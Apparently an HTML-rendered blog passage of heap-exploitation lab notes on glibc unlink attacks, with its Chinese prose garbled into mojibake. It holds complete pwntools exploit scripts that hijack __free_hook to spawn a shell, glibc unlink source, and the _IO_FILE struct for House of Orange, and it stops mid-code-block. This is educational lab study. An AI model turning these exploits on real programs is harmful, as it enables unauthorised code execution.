<h5 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/unsafe_unlink]<br>â””â”€$ checksec unsafe_unlink<br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      PIE enabled<br>    RWX:      Has RWX segments<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.23_unsafe-unlink&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="æ¼æ´åˆ©ç”¨-3"><a href="#æ¼æ´åˆ©ç”¨-3" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ç”±äºæ˜¯å¤è€æ—¶ä»£çš„unlinkï¼Œæ²¡æœ‰åŸºäºfdï¼ŒåŠbkçš„å®‰å…¨æ£€æŸ¥ï¼Œåˆ©ç”¨unlinkçš„åå°„å†™å…¥æ¥ä¿®æ”¹<code>__free_hook</code>ï¼Œä»è€Œæ‰§è¡Œshellcode</p>
<p><img src="Heap.assets/image-20220916151609194.png" srcset="/img/loading.gif" lazyload alt="image-20220916151609194"></p>
</li>
</ul>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;unsafe_unlink&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br><br><span class="hljs-comment"># This binary leaks the heap start address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;heap @ &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.</span><br>shellcode = asm(<span class="hljs-string">&quot;jmp shellcode;&quot;</span> + <span class="hljs-string">&quot;nop;&quot;</span>*<span class="hljs-number">0x16</span> + <span class="hljs-string">&quot;shellcode:&quot;</span> + shellcraft.execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>chunk_A = malloc(<span class="hljs-number">0x88</span>)<br>chunk_B = malloc(<span class="hljs-number">0x88</span>)<br><br>fd = libc.sym.__free_hook - <span class="hljs-number">0x18</span><br>bk = heap + <span class="hljs-number">0x20</span><br><br>edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x90</span>)*<span class="hljs-number">2</span>)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="Unlink-new"><a href="#Unlink-new" class="headerlink" title="Unlink(new)"></a>Unlink(<del>new</del>)</h3><h4 id="è¯¦æƒ…-3"><a href="#è¯¦æƒ…-3" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p><img src="Heap.assets/image-20220916180441088.png" srcset="/img/loading.gif" lazyload alt="image-20220916180441088"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>	malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>	  <span class="hljs-keyword">else</span><br>	    &#123;<br>	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>	    &#125;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>	&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>ä¼ªé€ ä¸€ä¸ªå‡çš„chunkï¼Œä»åˆæ³•chunkçš„ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—å¼€å§‹ï¼Œå°†å…¶fdå’Œbkåˆ†åˆ«æŒ‡å‘ç”¨ æˆ·æ•°æ®æŒ‡é’ˆä¹‹å‰çš„0x18å’Œ0x10å­—èŠ‚ï¼Œå®ƒä»¬ä½äºè¯¥chunkä¸­ã€‚ä¸ºåç»­çš„æ•°æ®å—è®¾è®¡ä¸€ä¸ªprev_size å­—æ®µï¼Œæ¯”å‰ä¸€ä¸ªæ•°æ®å—çš„å®é™…å¤§å°å°‘0x10å­—èŠ‚ã€‚åˆ©ç”¨ä¸€ä¸ªæº¢å‡ºé”™è¯¯æ¥æ¸…é™¤åç»§å—çš„prev_inuseä½ï¼Œå½“è¿™ä¸ªå—è¢«é‡Šæ”¾æ—¶ï¼Œmallocå°†è¯•å›¾æŠŠå®ƒä¸å‡çš„å—å‘ååˆå¹¶ã€‚å‡çš„å—çš„fdæ‰€æŒ‡å‘çš„å—çš„bkæŒ‡å‘å‡çš„å—ï¼Œè€Œå‡çš„å—çš„bkæ‰€æŒ‡å‘çš„å—çš„fdä¹ŸæŒ‡å‘å‡çš„å—ï¼Œæ»¡è¶³äº†safe linkçš„æ£€æŸ¥ã€‚è§£é™¤é“¾æ¥è¿‡ç¨‹çš„ç»“æœæ˜¯ï¼Œå‡å—çš„æŒ‡é’ˆï¼ˆæŒ‡å‘åˆæ³•å—çš„ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆï¼‰è¢«è¦†ç›–ä¸ºè‡ªèº«çš„åœ°å€å‡å»0x18ã€‚</p>
<p><img src="Heap.assets/image-20220916182208311.png" srcset="/img/loading.gif" lazyload alt="image-20220916182208311"></p>
<h4 id="ç¤ºä¾‹ä¸€-safe-unlink"><a href="#ç¤ºä¾‹ä¸€-safe-unlink" class="headerlink" title="ç¤ºä¾‹ä¸€  safe unlink"></a>ç¤ºä¾‹ä¸€  safe unlink</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§<a href="attachment/safe_unlink/safe_unlink">safe_unlink</a></p>
</blockquote>
<h5 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/safe_unlink]<br>â””â”€$ checksec safe_unlink<br>[*] &#x27;/home/fanya/Desktop/heap/heaplab/part1/safe_unlink/safe_unlink&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  &#x27;../.glibc/glibc_2.30_no-tcache&#x27;<br></code></pre></td></tr></table></figure>

<h5 id="æ¼æ´åˆ©ç”¨-4"><a href="#æ¼æ´åˆ©ç”¨-4" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li>å› ä¸ºå­˜åœ¨ä¸€ä¸ª<code>m_array</code>æ¥å‚¨å­˜æ‰€ç”³è¯·çš„chunkï¼Œä»è€Œæ–¹ä¾¿unlinkçš„åˆ©ç”¨ï¼Œä»è€Œä¿®æ”¹<code>__free_hook</code>ã€‚</li>
</ul>
<h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;safe_unlink&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br>info(<span class="hljs-string">f&quot;m_array @ 0x<span class="hljs-subst">&#123;elf.sym.m_array:02x&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Request 2 small chunks.</span><br>chunk_A = malloc(<span class="hljs-number">0x88</span>)<br>chunk_B = malloc(<span class="hljs-number">0x88</span>)<br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># Prepare fake chunk metadata.</span><br>fd = elf.sym.m_array - <span class="hljs-number">0x18</span><br>bk = elf.sym.m_array - <span class="hljs-number">0x10</span><br>prev_size = <span class="hljs-number">0x80</span><br>fake_size = <span class="hljs-number">0x90</span><br>edit(chunk_A, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x80</span>) + p64(fd) + p64(bk) + p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x60</span> + p64(prev_size) + p64(fake_size))<br><br><span class="hljs-comment"># pause()</span><br>free(chunk_B)<br><br>edit(chunk_A, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym.__free_hook - <span class="hljs-number">0x8</span>))<br>edit(chunk_A, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym.system ))<br>free(chunk_A)<br><br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p><img src="Heap.assets/image-20220929171044220.png" srcset="/img/loading.gif" lazyload alt="image-20220929171044220"></p>
<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 